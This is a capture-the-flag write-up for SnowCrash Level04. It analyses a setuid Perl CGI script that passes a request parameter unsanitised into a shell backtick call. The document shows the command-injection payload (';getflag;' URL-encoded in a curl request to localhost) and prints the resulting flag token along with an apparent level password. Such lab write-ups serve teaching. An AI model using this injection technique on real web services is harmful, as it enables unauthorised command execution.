# SnowCrash

qi0maab88jeaj46qoumi7maus

## Level04

```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Once again this file runs with the flag04 permissions

We can open it directly using cat since it's a perl script and not a binary file

```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Script analysis
This script uses the CGI module to handle web requests
There is also a comment # localhost:4747 likely indicating that this script is intended to run (might already be running) on this address

It's running a subroutine called x

```pl
sub x {
  $y = $_[0]; # store the first argument into y
  print `echo $y 2>&1`; # will run the command : echo $y
}
```

We can exploit this by making $y = "; getflag ;"

in order to run both the echo command and the getflag command

## Exploit

This one is pretty simple since the subroutine 'x' is ran like this:

```
x(param("x"))
```

We just need to set x=";getflag;" when querying localhost:4747 and make to sure to respect URL Encoding by replacing ';' with '%3B' which is it's hex value

```sh
level04@SnowCrash:~$ curl http://localhost:4747?x=%3Bgetflag%3B

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```